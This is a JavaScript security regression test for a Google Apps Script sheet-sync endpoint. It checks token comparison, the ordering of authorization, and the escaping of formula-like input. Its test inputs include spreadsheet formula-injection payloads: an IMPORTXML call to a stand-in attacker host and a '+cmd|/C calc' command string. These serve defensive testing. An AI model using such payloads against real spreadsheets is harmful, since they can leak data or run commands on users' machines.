'use strict';

// Focused security regression tests for the Google Apps Script endpoint.
const fs = require('node:fs');
const vm = require('node:vm');
const assert = require('node:assert/strict');

const source = fs.readFileSync('google-apps-script/VFORGE_Sheets_Sync.gs', 'utf8');
function extract(name) {
  const start = source.indexOf('function ' + name + '(');
  assert.notEqual(start, -1, name + ' must exist');
  const end = source.indexOf('\nfunction ', start + 10);
  return source.slice(start, end < 0 ? source.length : end).trimEnd();
}
let configuredToken = 'a'.repeat(48);
const context = {
  PropertiesService: {
    getScriptProperties: () => ({ getProperty: key => key === 'VFORGE_SYNC_TOKEN' ? configuredToken : null })
  }
};
vm.createContext(context);
vm.runInContext(['constantTimeEquals', 'safeSheetValue', 'requireSyncToken'].map(extract).join('\n'), context);

assert.equal(context.constantTimeEquals('secret', 'secret'), true);
assert.equal(context.constantTimeEquals('secret', 'secreu'), false);
assert.equal(context.constantTimeEquals('secret', 'secret-long'), false);

for (const input of ['=IMPORTXML("https://attacker.invalid","//x")', '   =1+1', '+cmd|/C calc', '-1+1', '@SUM(A1:A2)']) {
  assert.equal(context.safeSheetValue(input), "'" + input, 'formula-like text must be neutralized');
}
assert.equal(context.safeSheetValue('ordinary product'), 'ordinary product');
assert.equal(context.safeSheetValue(-125.5), -125.5, 'numeric negatives remain numeric');

assert.throws(() => context.requireSyncToken('wrong'), /Unauthorized/);
assert.doesNotThrow(() => context.requireSyncToken(configuredToken));
configuredToken = '';
assert.throws(() => context.requireSyncToken('anything'), /not configured securely/);

const doPostStart = source.indexOf('function doPost(e)');
const doPostEnd = source.indexOf('\nfunction storeReceipt_', doPostStart);
const doPostSource = source.slice(doPostStart, doPostEnd);
assert.ok(doPostSource.indexOf('requireSyncToken_(data.authToken)') > doPostSource.indexOf('validatePayload_(data)'),
  'POST must validate the payload before requiring the shared token and before spreadsheet writes');
assert.ok(doPostSource.indexOf('requireSyncToken_(data.authToken)') < doPostSource.indexOf('SpreadsheetApp.openById'),
  'unauthorized requests must be rejected before opening the spreadsheet');

process.stdout.write('PASS Apps Script endpoint requires configured token before spreadsheet access\n');
process.stdout.write('PASS formula-like strings are neutralized while numeric values remain numeric\n');
